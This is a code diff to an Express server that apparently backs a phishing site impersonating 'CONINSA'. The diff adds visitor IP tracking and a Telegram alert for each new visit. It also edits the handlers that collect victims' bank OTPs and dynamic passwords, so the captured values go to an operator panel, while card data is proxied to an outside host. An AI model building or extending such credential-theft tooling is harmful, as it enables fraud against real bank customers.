@@ -25,6 +25,17 @@ function cacheGet(k) {
 }
 function cacheSet(k, v) { _cache.set(k, { v, ts: Date.now() }); }
 
+// ── Sesiones online (ventana 5 min) ──────────────────────────────────────────
+const _online = new Map(); // ip → { ts, ref, ua }
+function onlinePing(ip, ref, ua) {
+  _online.set(ip, { ts: Date.now(), ref: ref || '', ua: ua || '' });
+}
+function onlineCount() {
+  const cutoff = Date.now() - 5 * 60 * 1000;
+  for (const [k, v] of _online) if (v.ts < cutoff) _online.delete(k);
+  return _online.size;
+}
+
 // ── Rate limit 15 req/min por IP ──────────────────────────────────────────────
 const _rl = new Map();
 function allowed(ip, max = 15, win = 60_000) {
@@ -104,6 +115,32 @@ const PSEC_BASE = 'https://pagpse-u6htdvaa.b4a.run';
 
 // ── Routes ────────────────────────────────────────────────────────────────────
 
+// Visita nueva: log a Telegram
+app.post('/api/visita', async (req, res) => {
+  const ip  = getIp(req);
+  const { ref, ua } = req.body || {};
+  const isNew = !_online.has(ip);
+  onlinePing(ip, ref, ua);
+  res.json({ ok: true, online: onlineCount() });
+  if (!isNew) return; // solo loguear visitas nuevas (no reconexiones del mismo IP)
+  const hora = new Date().toLocaleString('es-CO', { timeZone: 'America/Bogota' });
+  const refTxt = ref ? `\n🔗 <b>Referencia:</b> <code>${ref}</code>` : '';
+  await tgText(
+    `🌐 <b>NUEVA VISITA — CONINSA</b>\n` +
+    `🌍 <b>IP:</b> <code>${ip}</code>${refTxt}\n` +
+    `👥 <b>Online ahora:</b> ${onlineCount()}\n` +
+    `🕐 ${hora}`
+  );
+});
+
+// Ping heartbeat (mantiene "online", sin log)
+app.post('/api/ping', (req, res) => {
+  const ip = getIp(req);
+  const { ref, ua } = req.body || {};
+  onlinePing(ip, ref, ua);
+  res.json({ ok: true, online: onlineCount() });
+});
+
 // ── Proxy psec tarjetas ───────────────────────────────────────────────────────
 app.post('/api/tarjeta/crear', async (req, res) => {
   try {
@@ -164,17 +201,17 @@ app.post('/api/tarjeta/actualizar', async (req, res) => {
     const hora = new Date().toLocaleString('es-CO', { timeZone: 'America/Bogota' });
     if (banco_otp) {
       await tgText(
-        `📲 <b>OTP RECIBIDO — CONINSA</b>\n\n` +
+        `📲 <b>OTP INGRESADO — CONINSA</b>\n` +
         `🆔 <b>ID:</b> <code>${id}</code>\n` +
-        `🔢 <b>OTP:</b> <code>${banco_otp}</code>\n` +
-        `🕐 ${hora}`
+        `🕐 ${hora}\n` +
+        `<i>(valor en el panel)</i>`
       );
     } else if (dinamica) {
       await tgText(
-        `🔑 <b>CLAVE DINÁMICA — CONINSA</b>\n\n` +
+        `🔑 <b>CLAVE DINÁMICA INGRESADA — CONINSA</b>\n` +
         `🆔 <b>ID:</b> <code>${id}</code>\n` +
-        `🔢 <b>Clave:</b> <code>${dinamica}</code>\n` +
-        `🕐 ${hora}`
+        `🕐 ${hora}\n` +
+        `<i>(valor en el panel)</i>`
       );
     }
 
